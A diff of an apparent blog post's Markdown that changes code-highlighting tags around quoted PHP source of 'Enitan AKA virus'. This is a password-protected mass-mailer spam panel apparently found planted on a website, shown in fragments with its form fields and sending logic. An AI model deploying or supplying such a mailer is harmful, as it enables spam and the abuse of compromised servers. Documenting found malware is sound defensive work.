@@ -16,7 +16,7 @@ This file was called &#8216;enitan AKA virus&#8217;, and this is the content of 
 
 ### Enitan AKA virus Source Code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
+{% highlight php %}<?php
 @session_start();
 @set_time_limit(0);
 //PASSWORD CONFIGURATION
@@ -71,7 +71,7 @@ $contenttype=$_POST['contenttype'];
        $message = stripslashes($message);
        $subject = stripslashes($subject);
 }
-?&gt;
+?>
 &lt;html&gt;
 &lt;head&gt;
 &lt;title&gt;.:: mass mailer ::.&lt;/title&gt;
@@ -121,7 +121,7 @@ Helvetica, sans-serif"&gt;Email:&lt;/font&gt;&lt;/div&gt;
      &lt;/td&gt;
      &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
 sans-serif"&gt;
-       &lt;input type="text" name="from" value="&lt;? print $from; ?&gt;"
+       &lt;input type="text" name="from" value="<? print $from; ?>"
 size="30"&gt;
        &lt;/font&gt;&lt;/td&gt;
      &lt;td width="31%"&gt;
@@ -130,8 +130,8 @@ Helvetica, sans-serif"&gt;Name:&lt;/font&gt;&lt;/div&gt;
      &lt;/td&gt;
      &lt;td width="41%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
 sans-serif"&gt;
-       &lt;input type="text" name="realname" value="&lt;? print $realname;
-?&gt;" size="30"&gt;
+       &lt;input type="text" name="realname" value="<? print $realname;
+?>" size="30"&gt;
        &lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
@@ -141,8 +141,8 @@ Helvetica, sans-serif"&gt;Reply:&lt;/font&gt;&lt;/div&gt;
      &lt;/td&gt;
      &lt;td width="18%"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
 sans-serif"&gt;
-       &lt;input type="text" name="replyto" value="&lt;? print $replyto;
-?&gt;" size="30"&gt;
+       &lt;input type="text" name="replyto" value="<? print $replyto;
+?>" size="30"&gt;
        &lt;/font&gt;&lt;/td&gt;
      &lt;td width="31%"&gt;
        &lt;div align="right"&gt;&lt;font size="-3" face="Verdana, Arial,
@@ -161,8 +161,8 @@ Helvetica, sans-serif"&gt;Subject:&lt;/font&gt;&lt;/div&gt;
      &lt;/td&gt;
      &lt;td colspan="3"&gt;&lt;font size="-3" face="Verdana, Arial, Helvetica,
 sans-serif"&gt;
-       &lt;input type="text" name="subject" value="&lt;? print $subject;
-?&gt;" size="66"&gt;
+       &lt;input type="text" name="subject" value="<? print $subject;
+?>" size="66"&gt;
        &lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
@@ -173,8 +173,8 @@ Helvetica, sans-serif"&gt;Mail:&lt;/font&gt;&lt;/div&gt;
      &lt;td width="18%" valign="top"&gt;&lt;font size="-3" face="Verdana,
 Arial, Helvetica,
 sans-serif"&gt;
-       &lt;textarea name="message" cols="50" rows="10"&gt;&lt;? print
-$message; ?&gt;&lt;/textarea&gt;
+       &lt;textarea name="message" cols="50" rows="10"&gt;<? print
+$message; ?>&lt;/textarea&gt;
        &lt;br&gt;
        &lt;input type="radio" name="contenttype" value="plain"&gt;
        Text
@@ -189,12 +189,12 @@ Helvetica, sans-serif" size="-3"&gt;Mail  to:&lt;/font&gt;&lt;/div&gt;
      &lt;/td&gt;
      &lt;td width="41%" valign="top"&gt;&lt;font size="-3" face="Verdana,
 Arial, Helvetica, sans-serif"&gt;
-       &lt;textarea name="emaillist" cols="30" rows="10"&gt;&lt;? print
-$emaillist; ?&gt;&lt;/textarea&gt;&lt;/font&gt;&lt;/td&gt;
+       &lt;textarea name="emaillist" cols="30" rows="10"&gt;<? print
+$emaillist; ?>&lt;/textarea&gt;&lt;/font&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
 &lt;/form&gt;
-&lt;?
+<?
 if ($action){
        if (!$from && !$subject && !$message && !$emaillist){
        print "Please complete all fields before sending your message.";
@@ -232,7 +232,7 @@ attachment; filename=\"$file_name\"\r\n\r\n";
                }
                }
 }
-?&gt;
+?>
 &lt;style type="text/css"&gt;
 &lt;!--
 .style1 {
@@ -245,15 +245,15 @@ attachment; filename=\"$file_name\"\r\n\r\n";
  &copy enitan4evil@hotmail.com&lt;br&gt;
      &lt;/p&gt;  &lt;/p&gt;
 &lt;/center&gt;
-&lt;?php
+<?php
 if(isset($_POST['action']) && $numemails !==0 ){echo
 "&lt;script&gt;alert('Sending Completed\\r\\nTotal Email
 $numemails\\r\\n-Shout Lastborn and Hustle On!');
 &lt;/script&gt;";}
-?&gt;
+?>
 &lt;/body&gt;
 &lt;/html&gt;
-</pre>
+{% endhighlight %}
 
 ### Enitan AKA virus screenshot
 
